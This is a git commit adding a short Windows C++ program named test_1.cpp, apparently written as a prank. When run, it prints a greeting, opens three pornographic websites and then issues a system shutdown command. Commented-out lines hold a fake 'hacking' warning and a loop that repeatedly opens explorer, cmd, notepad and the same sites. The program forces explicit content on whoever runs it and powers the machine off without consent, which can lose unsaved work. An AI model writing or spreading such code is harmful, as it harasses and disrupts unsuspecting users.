94093b0353c5db173649921ac5b84965b26cf461
ReahouXd <163674237+ReahouXd@users.noreply.github.com>
2024-03-17 09:24:35 +0700

    Add files via upload

---
+++ test_1.cpp
@@ -0,0 +1,29 @@
+#include<iostream>
+#include"antHeaderPlusPlus.h"
+using namespace std;
+int main()
+{
+	foreColor(4);
+	system("cls");
+//	gotoxy(50,8);cout<<"Warning!!!!!!!";
+//	Sleep(500);
+//	gotoxy(50,10);cout<<"YOUR Computer are hacking ";
+	gotoxy(50,10); cout<<"Welcome Bro!!! to XNXX"<<endl;
+	Sleep(500);
+    ShellExecute(NULL, "open", "https://www.xnxx.tv/search/jav+full+movies", NULL, NULL, SW_SHOWNORMAL);
+	ShellExecute(NULL, "open", "https://www.pornhub.com/video/search?search=jav", NULL, NULL, SW_SHOWNORMAL);
+	ShellExecute(NULL, "open", "https://www4.bestjavporn.com", NULL, NULL, SW_SHOWNORMAL);
+//	for(int i=5; i<=40; i++)
+//	{
+//		ShellExecute(NULL, "open", "explorer", NULL, NULL, SW_SHOWNORMAL);	
+//		ShellExecute(NULL, "open", "cmd", NULL, NULL, SW_SHOWNORMAL);
+//    	sleep(0.0000001);
+//		ShellExecute(NULL, "open", "notepad", NULL, NULL, SW_SHOWNORMAL);
+//		ShellExecute(NULL, "open", "https://www.xnxx.tv/search/jav+full+movies", NULL, NULL, SW_SHOWNORMAL);
+//		ShellExecute(NULL, "open", "https://www.pornhub.com/video/search?search=jav", NULL, NULL, SW_SHOWNORMAL);
+//		sleep(0.0000001);
+//	}
+	delay(3000);
+	system("c:\\windows\\system32\\shutdown /s");
+
+}
